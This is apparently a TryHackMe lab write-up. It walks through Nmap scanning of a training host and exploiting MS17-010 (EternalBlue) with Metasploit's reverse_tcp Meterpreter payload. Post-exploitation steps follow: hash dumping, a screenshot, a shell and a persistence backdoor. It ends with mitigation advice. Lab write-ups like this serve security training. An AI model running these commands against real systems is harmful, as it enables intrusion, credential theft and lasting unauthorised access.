## TryHackMe: Metasploit – Meterpreter  
**Status:** Completed  
**Badge Earned:** Metasploit  
**Tools Used:** Nmap, Metasploit Framework  
**Target:** 10.10.11.181 (Windows 7 SP1)

---

### 🔍 Reconnaissance with Nmap

**Objective:** Identify open ports and potential vulnerabilities on target `10.10.11.181`.

**Command Used:**

```bash
nmap -sV -sC --script vuln -oN blue.nmap 10.10.11.181
```

**Explanation:**
- `-sV`: Detects service versions.
- `-sC`: Runs default scripts for basic enumeration.
- `--script vuln`: Executes vulnerability detection scripts.
- `-oN blue.nmap`: Saves output to a file named `blue.nmap`.

**Key Finding:**

- Port `445` (SMB) is open and vulnerable to **MS17-010 (EternalBlue)**.
  
---

### 💥 Exploitation with Metasploit

**Objective:** Exploit the SMB vulnerability to gain remote access.

**Steps:**
1. Launch Metasploit:
   ```bash
   msfconsole
   ```
2. Load the EternalBlue exploit:
   ```bash
   use exploit/windows/smb/ms17_010_eternalblue
   ```
3. Set the payload:
   ```bash
   set payload windows/x64/meterpreter/reverse_tcp
   ```
4. Configure target and listener:
   ```bash
   set RHOSTS 10.10.11.181
   set LHOST [10.10.132.151]
   set LPORT [4444]
   ```
5. Run the exploit:
   ```bash
   exploit
   ```

**Result:**  
✅ Meterpreter session established — full remote access achieved.

---

### 🧬 Post-Exploitation Activities

| Action            | Command         | Outcome                          |
|-------------------|-----------------|----------------------------------|
| System Info       | `sysinfo`       | Confirmed OS and architecture    |
| User Info         | `getuid`        | Identified current user          |
| Credential Dump   | `hashdump`      | Extracted password hashes        |
| Screenshot        | `screenshot`    | Captured user desktop            |
| Shell Access      | `shell`         | Dropped into Windows shell       |
| Persistence       | `run persistence` | Created backdoor for re-entry |

---

### 🧯 Mitigation Recommendations

- Patch MS17-010 immediately.
- Disable SMBv1 protocol.
- Segment internal networks to limit lateral movement.
- Deploy EDR tools for real-time detection.
- Conduct regular vulnerability scans and patch audits.

---

### 📎 Artifacts

- `blue.nmap` – Nmap scan output
- Metasploit session logs
- Extracted hashes (redacted)
- Screenshots (if applicable)

---

This room sharpened my red team skills and deepened my understanding of post-exploitation workflows using Meterpreter. It’s now part of my growing cybersecurity portfolio focused on offensive security and ethical hacking.
